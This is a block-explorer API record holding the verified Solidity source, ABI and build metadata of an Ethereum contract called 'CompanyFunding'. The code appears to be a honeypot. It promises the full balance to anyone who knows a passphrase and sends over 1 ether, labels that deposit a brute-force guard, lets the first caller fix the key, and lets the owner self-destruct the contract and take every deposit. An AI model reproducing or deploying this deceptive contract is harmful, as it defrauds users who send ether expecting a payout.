{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\ncontract CompanyFunding\r\n{\r\n    bytes32 keyHash;\r\n    address owner;\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function withdraw(string key) public payable\r\n    {\r\n        require(msg.sender == tx.origin);\r\n        if(keyHash == keccak256(abi.encodePacked(key))) {\r\n            //Prevent brute force\r\n            if(msg.value > 1 ether) {\r\n                msg.sender.transfer(address(this).balance);\r\n            }\r\n        }\r\n    }\r\n\r\n    //Setup with passphrase\r\n    function setup(string key) public\r\n    {\r\n        if (keyHash == 0x0) {\r\n            keyHash = keccak256(abi.encodePacked(key));\r\n        }\r\n    }\r\n\r\n    //Update keyhash\r\n    function new_hash(bytes32 _keyHash) public\r\n    {\r\n        if (keyHash == 0x0) {\r\n            keyHash = _keyHash;\r\n        }\r\n    }\r\n\r\n    //Empty the wallet\r\n    function clear() public\r\n    {\r\n        require(msg.sender == owner);\r\n        selfdestruct(owner);\r\n    }\r\n\r\n    function get_owner() public view returns(address){\r\n        return owner;\r\n    }\r\n\r\n    //Deposit\r\n    function () public payable {\r\n\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"get_owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"key\",\"type\":\"string\"}],\"name\":\"setup\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"key\",\"type\":\"string\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"clear\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_keyHash\",\"type\":\"bytes32\"}],\"name\":\"new_hash\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"CompanyFunding","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://f4b07d4cccf0b009c17eedc51eaaccb70e8a073abfdc0fbbe387e0e1687b98cf"}]}